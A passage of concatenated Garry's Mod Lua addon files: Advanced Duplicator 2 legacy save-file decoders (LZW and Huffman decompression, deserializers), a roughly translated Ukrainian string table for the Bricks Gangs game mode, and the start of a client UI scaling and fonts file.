			error("expected angle, got EOF\n")
		end
	end,
	[10	] = function() -- Table Reference
		m = find(str,"\1",pos)
		if m then
			w = sub(str,pos+1,m-1)
			pos = m
		else
			error("expected table identifier, got EOF\n")
		end
		tblref = tables[w]
		
		if tblref then
			return tblref
		else
			error(format("table identifier %s points to nil\n", w))
		end
		
	end
}



local function read_v1()
	local t = byte(str,pos+1)
	if t then
		local dt = decode_types_v1[t]
		if dt then
			pos = pos + 1
			return dt()
		else
			error(format("encountered invalid data type (%u)\n",t))
		end
	else
		error("expected value, got EOF\n")
	end
end

decode_types_v1 = {
	[1	] = function()
		error("expected value, got terminator\n")
	end,
	[2	] = function() -- table
		local t = {}
		while true do
			if byte(str,pos+1) == 1 then
				pos = pos+1
				return t
			else
				t[read_v1()] = read_v1()
			end
		end
	end,
	[3	] = function() -- array
		local t, i = {}, 1
		while true do
			if byte(str,pos+1) == 1 then
				pos = pos+1
				return t
			else
				t[i] = read_v1()
				i = i + 1
			end
		end
	end,
	[4	] = function() -- false boolean
		return false
	end,
	[5	] = function() -- true boolean
		return true
	end,
	[6	] = function() -- number
		m = find(str,"\1",pos)
		if m then
			a = tonumber(sub(str,pos+1,m-1)) or 0
			pos = m
			return a
		else
			error("expected number, got EOF\n")
		end
	end,
	[7	] = function() -- string
		m = find(str,"\1",pos)
		if m then
			w = sub(str,pos+1,m-1)
			pos = m
			return w
		else
			error("expected string, got EOF\n")
		end
	end,
	[8	] = function() -- Vector
		m,n = find(str,".-\1.-\1.-\1",pos)
		if m then
			a,b,c = match(str,"^(.-)\1(.-)\1(.-)\1",pos+1)
			pos = n
			return Vector(tonumber(a), tonumber(b), tonumber(c))
		else
			error("expected vector, got EOF\n")
		end
	end,
	[9	] = function() -- Angle
		m,n = find(str,".-\1.-\1.-\1",pos)
		if m then
			a,b,c = match(str,"^(.-)\1(.-)\1(.-)\1",pos+1)
			pos = n
			return Angle(tonumber(a), tonumber(b), tonumber(c))
		else
			error("expected angle, got EOF\n")
		end
	end
}

local function deserialize_v1(data)
	str = data
	pos = 0
	tables = {}
	return read_v1()
end

local function deserialize_v2(data)
	str = data
	pos = 0
	tables = {}
	return read_v2()
end

local function lzwDecode(encoded)
	local dictionary_length = 256
	local dictionary = {}
	for i = 0, 255 do
		dictionary[i] = char(i)
	end
	
	local pos = 2
	local decompressed = {}
	local decompressed_length = 1
	
	local index = byte(encoded)
	local word = dictionary[index]
	
	decompressed[decompressed_length] = dictionary[index]
	
	local entry
	local encoded_length = #encoded
	local firstbyte --of an index
	while pos <= encoded_length do
		firstbyte = byte(encoded,pos)
		if firstbyte > 252 then --now we know it's a length indicator for a multibyte index
			index = 0
			firstbyte = 256 - firstbyte
			
			--[[if pos+firstbyte > encoded_length then	--will test for performance impact
				error("expected index got EOF")
			end]]
			
			for i = pos+firstbyte, pos+1, -1 do
				index = bit.bor(bit.lshift(index, 8), byte(encoded,i))
			end
			pos = pos + firstbyte + 1
		else
			index = firstbyte
			pos = pos + 1
		end
		entry = dictionary[index] or (word..sub(word,1,1))
		decompressed_length = decompressed_length + 1
		decompressed[decompressed_length] = entry
		dictionary[dictionary_length] = word..sub(entry,1,1)
		dictionary_length = dictionary_length + 1
		word = entry
	end
	return concat(decompressed)
end

--http://en.wikipedia.org/wiki/Huffman_coding#Decompression

local invcodes = {[2]={[0]="\254"},[5]={[22]="\1",[11]="\2"},[6]={[13]="\7",[35]="\6",[37]="\5",[58]="\3",[31]="\8",[9]="\13",[51]="\9",[55]="\10",[57]="\4",[59]="\15"},[7]={[1]="\14",[15]="\16",[87]="\31",[89]="\30",[62]="\26",[17]="\27",[97]="\19",[19]="\43",[10]="\12",[39]="\33",[41]="\24",[82]="\40",[3]="\32",[46]="\41",[47]="\38",[94]="\25",[65]="\23",[50]="\39",[26]="\11",[7]="\28",[33]="\18",[61]="\17",[25]="\42"},[8]={[111]="\101",[162]="\29",[2]="\34",[133]="\21",[142]="\36",[5]="\20",[21]="\37",[170]="\44",[130]="\22",[66]="\35"},[9]={[241]="\121",[361]="\104",[365]="\184",[125]="\227",[373]="\198",[253]="\117",[381]="\57",[270]="\49",[413]="\80",[290]="\47",[294]="\115",[38]="\112",[429]="\74",[433]="\0",[437]="\48",[158]="\183",[453]="\107",[166]="\111",[469]="\182",[477]="\241",[45]="\86",[489]="\69",[366]="\100",[497]="\61",[509]="\76",[49]="\53",[390]="\78",[279]="\196",[283]="\70",[414]="\98",[53]="\55",[422]="\109",[233]="\79",[349]="\89",[369]="\52",[14]="\105",[238]="\56",[319]="\162",[323]="\83",[327]="\63",[458]="\65",[335]="\231",[339]="\225",[337]="\114",[347]="\193",[493]="\139",[23]="\209",[359]="\250",[490]="\68",[42]="\54",[63]="\91",[286]="\97",[254]="\50",[510]="\108",[109]="\73",[67]="\103",[255]="\122",[69]="\170",[70]="\110",[407]="\176",[411]="\119",[110]="\120",[83]="\146",[149]="\163",[151]="\224",[85]="\51",[155]="\177",[79]="\251",[27]="\118",[447]="\159",[451]="\228",[455]="\175",[383]="\174",[463]="\243",[467]="\157",[173]="\210",[475]="\167",[177]="\84",[90]="\45",[487]="\206",[93]="\226",[495]="\245",[207]="\64",[127]="\147",[191]="\155",[511]="\153",[195]="\208",[197]="\85",[199]="\178",[181]="\82",[102]="\116",[103]="\71",[285]="\144",[105]="\102",[211]="\199",[213]="\123",[301]="\66",[305]="\46",[219]="\137",[81]="\67",[91]="\88",[157]="\130",[325]="\95",[29]="\58",[231]="\201",[117]="\99",[341]="\222",[237]="\77",[239]="\211",[71]="\223"},[10]={[710]="\149",[245]="\60",[742]="\172",[774]="\81",[134]="\151",[917]="\145",[274]="\216",[405]="\242",[146]="\194",[838]="\246",[298]="\248",[870]="\189",[1013]="\150",[894]="\190",[326]="\244",[330]="\166",[334]="\217",[465]="\179",[346]="\59",[354]="\180",[966]="\212",[974]="\143",[370]="\148",[998]="\154",[625]="\138",[382]="\161",[194]="\141",[198]="\126",[402]="\96",[206]="\185",[586]="\129",[721]="\187",[610]="\135",[618]="\181",[626]="\72",[226]="\62",[454]="\127",[658]="\113",[462]="\164",[234]="\214",[474]="\140",[242]="\106",[714]="\188",[730]="\87",[498]="\237",[746]="\125",[754]="\229",[786]="\128",[202]="\93",[18]="\255",[810]="\173",[846]="\131",[74]="\192",[842]="\142",[977]="\252",[858]="\235",[78]="\134",[874]="\234",[882]="\90",[646]="\92",[1006]="\160",[126]="\165",[914]="\221",[718]="\94",[738]="\238",[638]="\197",[482]="\230",[34]="\220",[962]="\133",[6]="\213",[706]="\219",[986]="\171",[994]="\233",[866]="\200",[1010]="\247",[98]="\169",[518]="\236",[494]="\207",[230]="\205",[542]="\191",[501]="\202",[530]="\203",[450]="\204",[209]="\158",[106]="\186",[590]="\136",[218]="\232",[733]="\124",[309]="\168",[221]="\152",[757]="\240",[113]="\215",[114]="\156",[362]="\239",[486]="\132",[358]="\249",[262]="\75",[30]="\218",[821]="\195",[546]="\253"}}

local function huffmanDecode(encoded)
	
	local h1,h2,h3 = byte(encoded, 1, 3)
	
	if (not h3) or (#encoded < 4) then
		error("invalid input")
	end
	
	local original_length = bit.bor(bit.lshift(h3,16), bit.lshift(h2,8), h1)
	local encoded_length = #encoded+1
	local decoded = {}
	local decoded_length = 0
	local buffer = 0
	local buffer_length = 0
	local code
	local code_len = 2
	local temp
	local pos = 4
	
	while decoded_length < original_length do
		if code_len <= buffer_length then
			temp = invcodes[code_len]
			code = bit.band(buffer, bit.lshift(1, code_len)-1)
			if temp and temp[code] then --most of the time temp is nil
				decoded_length = decoded_length + 1
				decoded[decoded_length] = temp[code]
				buffer = bit.rshift(buffer, code_len)
				buffer_length = buffer_length - code_len
				code_len = 2
			else
				code_len = code_len + 1
				if code_len > 10 then
					error("malformed code")
				end
			end
		else
			buffer = bit.bor(buffer, bit.lshift(byte(encoded, pos), buffer_length))
			buffer_length = buffer_length + 8
			pos = pos + 1
			if pos > encoded_length then
				error("malformed code")
			end
		end
	end
	
	return concat(decoded)
end

local function invEscapeSub(str)
	local escseq,body = match(str,"^(.-)\n(.-)$")
	
	if not escseq then error("invalid input") end
	
	return gsub(body,escseq,"\26")
end

local dictionary
local subtables

local function deserializeChunk(chunk)
	
	local ctype,val = byte(chunk),sub(chunk,3)
	
	if     ctype == 89 then return dictionary[ val ]
	elseif ctype == 86 then
		local a,b,c = match(val,"^(.-),(.-),(.+)$")
		return Vector( tonumber(a), tonumber(b), tonumber(c) )
	elseif ctype == 65 then
		local a,b,c = match(val,"^(.-),(.-),(.+)$")
		return Angle( tonumber(a), tonumber(b), tonumber(c) )
	elseif ctype == 84 then 
		local t = {}
		local tv = subtables[val]
		if not tv then
			tv = {}
			subtables[ val ] = tv
		end
		tv[#tv+1] = t
		return t
	elseif ctype == 78 then return tonumber(val)
	elseif ctype == 83 then return gsub(sub(val,2,-2),"�",";")
	elseif ctype == 66 then return val == "t"
	elseif ctype == 80 then return 1
	end
	
	error(format("AD1 deserialization failed: invalid chunk (%u:%s)",ctype,val))
	
end

local function deserializeAD1(dupestring)
	
	dupestring = dupestring:Replace("\r\n", "\n")
	local header, extraHeader, dupeBlock, dictBlock = dupestring:match("%[Info%]\n(.+)\n%[More Information%]\n(.+)\n%[Save%]\n(.+)\n%[Dict%]\n(.+)")
	
	if not header then
		error("unknown duplication format")
	end
	
	local info = {}
	for k,v in header:gmatch("([^\n:]+):([^\n]+)") do
		info[k] = v
	end
		
	local moreinfo = {}
	for k,v in extraHeader:gmatch("([^\n:]+):([^\n]+)") do
		moreinfo[k] = v
	end
	
	dictionary = {}
	for k,v in dictBlock:gmatch("(.-):\"(.-)\"\n") do
		dictionary[k] = v
	end

	local dupe = {}
	for key,block in dupeBlock:gmatch("([^\n:]+):([^\n]+)") do
		
		local tables = {}
		subtables = {}
		local head
		
		for id,chunk in block:gmatch('(%w+){(.-)}') do
			
			--check if this table is the trunk
			if byte(id) == 72 then
				id = sub(id,2)
				head = id
			end
			
			tables[id] = {}
			
			for kv in gmatch(chunk,'[^;]+') do
				
				local k,v = match(kv,'(.-)=(.+)')
				
				if k then
					k = deserializeChunk( k )
					v = deserializeChunk( v )
					
					tables[id][k] = v
				else
					v = deserializeChunk( kv )
					local tid = tables[id]
					tid[#tid+1]=v
				end
				
			end
		end
		
		--Restore table references
		for id,tbls in pairs( subtables ) do
			for _,tbl in pairs( tbls ) do
				if not tables[id] then error("attempt to reference a nonexistent table") end
				for k,v in pairs(tables[id]) do
					tbl[k] = v
				end
			end
		end
		
		dupe[key] = tables[ head ]
		
	end
	
	return dupe, info, moreinfo
	
end

--seperates the header and body and converts the header to a table
local function getInfo(str)
	local last = str:find("\2")
	if not last then
		error("attempt to read AD2 file with malformed info block error 1")
	end
	local info = {}
	local ss = str:sub(1,last-1)
	for k,v in ss:gmatch("(.-)\1(.-)\1") do
		info[k] = v
	end
	if info.check ~= "\r\n\t\n" then
		if info.check == "\10\9\10" then
			error("detected AD2 file corrupted in file transfer (newlines homogenized)(when using FTP, transfer AD2 files in image/binary mode, not ASCII/text mode)")
		else
			error("attempt to read AD2 file with malformed info block error 2")
		end
	end
	return info, str:sub(last+2)
end

--decoders for individual versions go here
local versions = {}

versions[2] = function(encodedDupe)
	encodedDupe = encodedDupe:Replace("\r\r\n\t\r\n", "\t\t\t\t")
	encodedDupe = encodedDupe:Replace("\r\n\t\n", "\t\t\t\t")
	encodedDupe = encodedDupe:Replace("\r\n", "\n")
	encodedDupe = encodedDupe:Replace("\t\t\t\t", "\r\n\t\n")
	local info, dupestring = getInfo(encodedDupe:sub(7))
	return deserialize_v2(
				lzwDecode(
					huffmanDecode(
						invEscapeSub(dupestring)
					)
				)
			), info
end

versions[1] = function(encodedDupe)
	encodedDupe = encodedDupe:Replace("\r\r\n\t\r\n", "\t\t\t\t")
	encodedDupe = encodedDupe:Replace("\r\n\t\n", "\t\t\t\t")
	encodedDupe = encodedDupe:Replace("\r\n", "\n")
	encodedDupe = encodedDupe:Replace("\t\t\t\t", "\r\n\t\n")
	local info, dupestring = getInfo(encodedDupe:sub(7))
	return deserialize_v1(
				lzwDecode(
					huffmanDecode(
						invEscapeSub(dupestring)
					)
				)
			), info
end

versions[0] = deserializeAD1

AdvDupe2.LegacyDecoders = versions
--PATH addons/bricks_gangs/lua/bricks_server/languages/bricks_gangs/ukrainian.lua:
BRICKS_SERVER.Func.AddLanguageStrings( "ukrainian", {
    ["gang"] = "Банда",
    ["gangNew"] = "Створити банду",
    ["gangRequestCooldown"] = "Будь Ласка зачекайте, перед тим запросити другие банди!",
    ["gangRequestDataCooldown"] = "Будь Ласка зачекайте, перед тим запросити данную про банди!",
    ["gangNewUpgrade"] = "Нове улучшение",
    ["gangUpgradeTierEdit"] = "%s - Лвл %d",
    ["gangNewAchievement"] = "Нове досягненя",
    ["gangNewTerritory"] = "Нове Тереторiя",
    ["gangRewardTime"] = "Время приза",
    ["gangRewardTimeQuery"] = "Как часто банда которая одержала терреторию, должна получать награди?",
    ["gangRewards"] = "Награди",
    ["gangNewLeaderboard"] = "Нове меню лiдеров",
    ["gangRankQuery"] = "Який ранг ви хотели би установить?",
    ["gangPlayerAlreadyRank"] = "Данний игрок вже имеет данний ранг!",
    ["gangInvalidRank"] = "Неверний ранг.",
    ["gangKick"] = "Вигнать",
    ["gangKickConfirm"] = "Ви уверени что хотите вигнать данного игрока?",
    ["gangSetOwner"] = "Установить владельца",

    ["gangInbox"] = "Крiмiнальна почта",
    ["gangNoNotifications"] = "У вас нет нових уведомлений!",
    ["gangTimeAgo"] = "%s назад",
    ["gangNotification"] = "Нове уведомление",
    ["gangNotificationHeader"] = "Який будет заголовок повiдомленя?",
    ["gangAdminNotification"] = "Админское уведомление",
    ["gangNotificationBody"] = "Что ви напишите в основной части повiдомленя?",
    ["gangAdminNotificationSent"] = "Админское уведомление отправлено %s!",

    ["gangVariables"] = "Вариации Банди",
    ["gangUpgrades"] = "Оновленя банди",
    ["gangAchievements"] = "Досягненя банди",
    ["gangTerritories"] = "Тереторiя банди",
    ["gangLeaderboards"] = "Доска лiдеров",

    ["gangClaimedAchievement"] = "Успiх!, получено досягненя!",
    ["gangAlreadyAssociation"] = "Ваша банда вже имеет такой тип связи с другой бандой!",
    ["gangAlreadySentAssociation"] = "Ваша банда вже отправила им приглашение, в ассоциацию!",
    ["gangAssociationSent"] = "Приглашение ассоциации отправлено!",
    ["gangAssociationAccepted"] = "Приглашение ассоциации принято!",
    ["gangNoAssociation"] = "Ваша банда не имеет никакого отношения к этой банде!",
    ["gangAssociationDissolved"] = "Ассоциация распущена!",

    ["gangOwner"] = "Владелец",
    ["gangOfficer"] = "Офицер",
    ["gangMember"] = "Участник",

    ["gangCannotDeposit"] = "Ви не можете положить это оружие!",
    ["gangStorageFull"] = "Хранилище банди переполнено!",
    ["gangDepositedItem"] = "Ви поклали предмет в хранилище банди!",
    ["gangDroppedItem"] = "Виброшено 1 предмет из вашего хранилища банди.",
    ["gangUsedItem"] = "Использован 1 предмет из вашего хранилища банди.",
    ["gangCantUse"] = "Ви не можете использовать это!",

    ["gangKicked"] = "Вас вигнали из банди %s!",
    ["gangAlreadyIn"] = "Ви вже в банде!",
    ["gangNameLength"] = "Название банди не может бить длиннее %d символов!",
    ["gangIconLength"] = "URL значка банди не может бить длиннее %d символов!",
    ["gangCreatedFor"] = "Ваша Нове банда била создана для %s!",
    ["gangCreated"] = "Ваша банда создана!",
    ["gangCreationNoMoney"] = "Вам не хватает денег, вам нужно %s!",
    ["gangWaitBeforeSaving"] = "Будь Ласка, зачекайте %d секунд, перед тим чем сохранить изменения!",
    ["gangRolesUpdated"] = "Ранги банди обновлени!",
    ["gangCannotTarget"] = "Ви не можете трогать его!",
    ["gangRankNotExists"] = "Данний ранг не найден!",
    ["gangCantPromote"] = "Ви не можете повисить кого-либо на Лвл више, или такой же как у вас!",
    ["gangRankSet"] = "Ранг Успiх! установлен!",
    ["gangRankSetFail"] = "Не удалось установить ранг!",
    ["gangSettingsUpdated"] = "Настройки банди обновлени!",
    ["gangPlayerKicked"] = "Удачно вигнан %s с вашей банди!",
    ["gangPlayerKickError"] = "Ошибка при изгнании учасника!",
    ["gangWaitBeforeInvite"] = "Будь Ласка, зачекайте 5 секунд перед тим чем Пригласити другого игрока!",
    ["gangPlayerOffline"] = "Этот игрок больше не в сети!",
    ["gangPlayerAlreadyInvited"] = "Этот игрок вже имеет активное приглашение!",
    ["gangPlayerInvited"] = "Ви пригласили, %s в вашу банду!",
    ["gangInviteReceived"] = "Ви били приглашени в банду %s! Введите !gang даби принять.",
    ["gangLeaveCurrent"] = "Ви должни покинуть свою текущую банду в первую очередь!",
    ["gangReachedMemberLimit"] = "Банда достигла предела своих участников!",
    ["gangJoined"] = "Успiх! вступили в %s!",
    ["gangNotEnoughMoney"] = "Вам не хватает денег!",
    ["gangDepositedMoney"] = "Ви Успiх! внесли %s в вашу банду!",
    ["gangWithdrewMoney"] = "Ви Успiх! сняли %s с вашей банди!",
    ["gangDisbanded"] = "Ваша банда Успiх! распущена %s!",
    ["gangOwnershipTransfered"] = "Успiх! передано право владения банди с %s на %s!",
    ["gangLeft"] = "Ви покинули %s!",

    ["gangTerritoryCaptured"] = "Ваша банда захватила %s территорию!",
    ["gangIncorrectLevel"] = "Ваша банда не имеет нужний Лвл, чтоби купить это обновление!",
    ["gangIncorrectGroup"] = "Ви не подходящая группа, чтоби купить это обновление!",
    ["gangUpgradeBought"] = "Обновление куплено для банди %s!",
    ["gangNotEnoughFunds"] = "У вашей банди недостаточно средств для покупки этого улучшения!",

    ["gangAddAchievement"] = "Добавить досягненя",
    ["gangNewAchievementType"] = "Каким должен бить новий тип достижений?",
    ["gangAddLeaderboard"] = "Добавить таблицу лiдеров",
    ["gangNewLeaderboardType"] = "Каким должен бить новий тип таблици лiдеров??",
    ["gangAddTerritory"] = "Добавить территорию",
    ["gangAddTier"] = "Добавить Лвл",
    ["gangTierX"] = "Лвл %d",
    ["gangNewUpgradeType"] = "Каким должен бить новий тип улучшения?",
    ["gangNewUpgradeDesc"] = "Нове описание улучшения.",

    ["gangDepositMenu"] = "Меню депозита",
    ["gangDepositInventoryQuery"] = "Ви хотите внести депозит %s с вашего инвентаря?",
    ["gangDepositPlayerQuery"] = "Ви хотите внести депозит %s с вашего владения?",
    ["gangNoDepositItems"] = "У вас нет предметов, которие можно сдать на в хранилище банди!",

    ["gangMenu"] = "Меню банди",
    ["gangNone"] = "Нет банди",
    ["gangID"] = "ID: %d",
    ["gangDashboard"] = "Управление",
    ["gangMembers"] = "Участники",
    ["gangStorage"] = "Хранилище",
    ["gangUpgrades"] = "Улучшения",
    ["gangBalance"] = "Баланс",
    ["gangAchievements"] = "Досягненя",
    ["gangAssociations"] = "Ассоциации",
    ["gangLeaderboards"] = "Таблица лiдеров",
    ["gangTerritories"] = "Территории",
    ["gangRanks"] = "Ранги",
    ["gangCreate"] = "Создать банду",
    ["gangProgress"] = "Прогресс: %s",

    ["gangNoneFound"] = "По вашему запросу ничего не найдено.",
    ["gangMemberCount"] = "%d/%d Участники",
    ["gangFailedToLoad"] = "Произошла ошибка при загрузке данних!",
    ["gangSetRank"] = "Установить ранг",
    ["gangDissolveAssociation"] = "Хотели би ви расторгнуть цю ассоциацию??",
    ["gangAssociationStatus"] = "Статус: %s",
    ["gangNeutral"] = "Нейтрально",
    ["gangCreateString"] = "Создать банду для %s",
    ["gangName"] = "Название:",
    ["gangIcon"] = "URL Значка:",
    
    ["gangInformation"] = "ИНФОРМАЦИЯ О БАНДЕ",
    ["gangChat"] = "ЧАТ БАНДи",
    ["gangMessage"] = "Сообщение банди",
    ["gangActions"] = "ДЕЙСТВИЯ БАНДи",
    ["gangDepositMoney"] = "Внести грошi",
    ["gangDepositMoneyQuery"] = "Сколько би ви хотели внести на депозит?",
    ["gangDepositMoneyLess"] = "Ви не можете внести депозит меньше, чем %s!",
    ["gangDepositMoneyMuch"] = "Баланс вашей банди не может вместить так много, ви должни улучшить хранилище баланса!",
    ["gangWithdrawMoney"] = "Снять деньги",
    ["gangWithdrawMoneyQuery"] = "Сколько би ви хотели снять?",
    ["gangWithdrawMoneyLess"] = "Ви не можете снять меньше, чем %s!",
    ["gangWithdrawMoneyMuch"] = "Вашей банде не хватает средств!",
    ["gangInvitePlayer"] = "Пригласити игрока",
    ["gangInvitePlayerQuery"] = "Какого игрока ви би хотели Пригласити?",
    ["gangDisband"] = "Распустити банду",
    ["gangDisbandQuery"] = "Видаленя вашей банди не может бить отменено, введите %s даби Видалити банду.",
    ["gangTransfer"] = "Передать права на банду",
    ["gangTransferQuery"] = "Кому би ви хотели передать права банди?",
    ["gangLeave"] = "Покинуть банду",
    ["gangLeaveQuery"] = "Ви уверени, что хотите покинуть цю банду??",
    ["gangMemberUpper"] = "УЧАСТНИКИ БАНДи",
    ["gangHighestRank"] = "Наивисший ранг",
    ["gangLowestRank"] = "Самий низкий ранг",

    ["gangUnsavedChanges"] = "Внимание! У вас есть несохраненние изменения.",
    ["gangSaveChanges"] = "Сохранить изменения",
    ["gangReset"] = "Сбросить",
    ["gangRanksUpper"] = "РАНГИ БАНДи",
    ["gangNewRank"] = "Новий ранг",
    ["gangRankName"] = "Название ранга",
    ["gangRankColor"] = "Цвет ранга",
    ["gangClearPerms"] = "Очистить права",
    ["gangDeleteRank"] = "Видалити ранг",
    ["gangDeleteRankQuery"] = "Ви уверени, что хотите Видалити этот ранг?",

    ["gangStorageUpper"] = "ХРАНИЛИЩЕ БАНДи",
    ["gangStorageProgress"] = "Заполненость %d/%d",
    ["gangClaimed"] = "Создано",
    ["gangUnclaimed"] = "Не создано",
    ["gangClaimedAgo"] = "Создано %s назад",
    ["gangRewardsEvery"] = "Учитивая каждий %s",
    ["gangBuyUpgrade"] = "Ви хотите купить это обновление для %s?",
    ["gangUpgradeTier"] = "Лвл улучшения %d/%d",
    ["gangCurrent"] = "Текущий Лвл: %s",
    ["gangNext"] = "Следующий Лвл: %s",

    ["gangTerritoryUpper"] = "ТЕРРИТОРИИ",
    ["gangCaptured"] = "ЗАХВАЧЕНО",
    ["gangTerritoryAlready"] = "Ваша банда вже захватила цю территорию!",
    ["gangCaptureFail"] = "Ви отошли слишком далеко или погибли, захват не удался!",
    ["gangTerritoryPlaced"] = "Тереторiя Успiх! размещена.",
    ["gangInvalidTerritory"] = "Неверная Тереторiя, виберите действительную из меню инструментов.",
    ["gangTerritoryRemoved"] = "Тереторiя Успiх! удалена.",
    ["gangTerritoryRemoveFail"] = "Ви можете использовать этот инструмент только для удаления/создания территорий.",
    ["gangTerritoryDesc"] = "Розмiшюе и видаляе территории с Brick's Gangs. Щелкните левой кнопкой миши - поместите, щелкните правой кнопкой миши - удалите.",
    ["gangTerritory"] = "Тереторiя",
    ["gangTerritoryPlacer"] = "Место территории",
    ["gangTerritoryDescSmall"] = "Розмiшюе i видаляе территории с сервера Брик.",
    ["gangTerritoryInstructions"] = "Левий клик - розмiстити, правий клик - Видалити.",

    ["gangSettings"] = "Налаштуваня",
    ["gangManagement"] = "Керуваня",
    ["gangChatLower"] = "Чат банди",
    ["gangDepositItems"] = "Депозит предметами",
    ["gangWithdrawItems"] = "Забрать предмети",
    ["gangViewStorage"] = "Посмотреть хранилище",
    ["gangEditRoles"] = "Изменить ранги",
    ["gangEditSettings"] = "Изменить настройки",
    ["gangInvitePlayers"] = "Пригласити игроков",
    ["gangKickPlayers"] = "Вигнать игроков",
    ["gangChangeRank"] = "Изменить ранг игрока",
    ["gangPurchaseUpgrades"] = "Купить улучшение",
    ["gangAcceptDeclineInbox"] = "Принять или отклонить входящие повiдомленя",
    ["gangAssociationSend"] = "Отправить запроси на ассоциацию",
    ["gangAssociationAccept"] = "Принять запроси на ассоциацию",
    ["gangSendChatMessages"] = "Отправить сообщение в чат",
    ["gangMaxMembers"] = "Макс. Участников",
    ["gangMaxBalance"] = "Макс. Баланс",
    ["gangStorageSlots"] = "Слоти хранилища",
    ["gangXSlots"] = "%d Слотов",
    ["gangSlots"] = "Слотов",
    ["gangIncreasedHealth"] = "Увеличение здоровья",
    ["gangExtraHealth"] = "Дополнительное здоровье",
    ["gangXHP"] = "+%d ХП",
    ["gangIncreasedArmor"] = "Усиленная броня",
    ["gangXAP"] = "+%d ЗАЩИТи",
    ["gangExtraArmor"] = "Дополнительная броня",
    ["gangIncreasedSalary"] = "Увеличение зарплати",
    ["gangExtraSalary"] = "Дополнительная зарплата",
    ["gangPermWeapon"] = "Вечное оружие",
    ["gangWeapon"] = "Оружие",
    ["gangBalanceFull"] = "Баланс банди",
    ["gangMembersFull"] = "Участники банди",
    ["gangStorageFull"] = "Хранилище банди",
    ["gangItems"] = "Предмети",
    ["gangItem"] = "Предмет",
    ["gangLevel"] = "Лвл банди",
    ["gangInvite"] = "Пригласити в банду",
    ["gangInviteReceivedInbox"] = "Вас пригласили вступить в банду %s!",
    ["gangAssociationInvite"] = "Приглашение ассоциации",
    ["gangAssociationInviteInbox"] = "Банда %s запросила ассоциацию '%s' с вашей бандой!",
    ["gangAssociationCreated"] = "Ассоциация создана",
    ["gangAssociationCreatedInbox"] = "Ваша банда теперь имеет ассоциацию '%s' с бандой %s!",
    ["gangAssociationDissolved"] = "Ассоциация распущена",
    ["gangAssociationDissolvedInbox"] = "Ваша связь с бандой %s распущена!",
    ["gangInboxAchievement"] = "досягненя банди",
    ["gangInboxAchievementCompleted"] = "Ваша банда завершила '%s' досягненя!",
    ["gangInboxAchievementCompletedReward"] = "Ваша банда завершила '%s' досягненя, ваша награда: %s!",
    ["gangExperienceFull"] = "Опит банди",
    ["gangJobWhitelist"] = "Белий список профессий",
    ["gangJobs"] = "Работи",
    ["gangJobsSelect"] = "Виберите команди, в которих игроки занесени в белий список.",
    ["gangStorageItems"] = "Хранение предметов",
    ["gangAllyRequest"] = "Ви уверени, что хотите запросити союз с этой бандой?",
    ["gangWarRequest"] = "Ви уверени, что хотите запросити войну с этой бандой?",
    ["gangSetLevel"] = "Установить Лвл",
    ["gangSetLevelQuery"] = "Каким должен бить новий Лвл банди?",
    ["gangSetLevelMsg"] = "Успiх! установлен Лвл банди с %s на %d!",
    ["gangAddExperience"] = "Добавить опит",
    ["gangAddExperienceQuery"] = "Який опит ви би хотели добавить в банду?",
    ["gangAddExperienceMsg"] = "Успiх! добавил %s опита в банду %s!",
    ["gangSetBalance"] = "Установить баланс",
    ["gangSetBalanceQuery"] = "Каким должен бить новий баланс банди?",
    ["gangSetBalanceMsg"] = "Успiх! установлен баланс банди с %s на %s!",
    ["gangAddBalance"] = "Добавить баланс",
    ["gangAddBalanceQuery"] = "Сколько денег ви хотели би добавить на баланс банди?",
    ["gangAddBalanceMsg"] = "Успiх! добавлено %s баланс для банди %s!",
    ["gangViewMembers"] = "Просмотр участников",
    ["gangCantKickOwner"] = "Ви не можете вигнать владельца банди!",
    ["gangKickSuccessAdmin"] = "Успiх! вигнали участника из банди!",
    ["gangKickFailAdmin"] = "Не удалось вигнать участника из банди!",
    ["gangSetRankSuccessAdmin"] = "Успiх! установить ранг участника!",
    ["gangSetRankFailAdmin"] = "Не удалось установить ранг участника!",
    ["gangMemberAlreadyOwner"] = "Этот участник вже является владельцем этой банди!",
    ["gangNotMember"] = "Этот игрок не является участником этой банди!",
    ["gangOwnershipTransferedAdmin"] = "Успiх! передани права на банду!",
    ["gangDeleteAdminQuery"] = "Видаленя банди не может бить отменено, введите %s даби Видалити.",
    ["gangDeleteSuccessAdmin"] = "Успiх! удалили банду %s!",
    ["gangMenuBind"] = "Хоткей(Бинд) для меню банди",
} )
--PATH addons/brick_s_server_framework/lua/bricks_server/core/client/cl_drawing.lua:
function BRICKS_SERVER.Func.ScreenScale( number, min, max )
    number = number*(ScrW()/2560)

    if( min and max ) then
        return math.Clamp( number, min, max )
    elseif( min or max ) then
        return min and math.max( min, number ) or math.min( max, number )
    else
        return number
    end
end

BRICKS_SERVER.UI = {
	Margin5 = BRICKS_SERVER.Func.ScreenScale( 5 ),
	Margin10 = BRICKS_SERVER.Func.ScreenScale( 10 ),
	Margin15 = BRICKS_SERVER.Func.ScreenScale( 15 ),
	Margin25 = BRICKS_SERVER.Func.ScreenScale( 25 ),
	Margin50 = BRICKS_SERVER.Func.ScreenScale( 50 ),
	Margin100 = BRICKS_SERVER.Func.ScreenScale( 100 )
}

function BRICKS_SERVER.Func.Repeat( val, amount )
	local args = {}
	for i = 1, amount do
		table.insert( args, val )
	end

	return unpack( args )
end

BRICKS_SERVER.DEVCONFIG.MainNavWidth = BRICKS_SERVER.Func.ScreenScale( 230 )
hook.Add( "OnScreenSizeChanged", "BRS.OnScreenSizeChanged.DevConfig", function()
    BRICKS_SERVER.DEVCONFIG.MainNavWidth = BRICKS_SERVER.Func.ScreenScale( 230 )
end )

--[[ FONTS ]]--
local function createFonts()
	surface.CreateFont( "BRICKS_SERVER_Font90", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 90 ),
		weight = 5000,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font25", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 25 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font24", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 24 ),
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_NoSC_Font24", {
		font = "Montserrat Medium",
		extended = false,
		size = 24,
		weight = 500,
		outline = false,
		extended = true,
	} )

	surface.CreateFont( "BRICKS_SERVER_Font23", {
		font = "Montserrat Medium",
		extended = false,
		size = BRICKS_SERVER.Func.ScreenScale( 23 ),
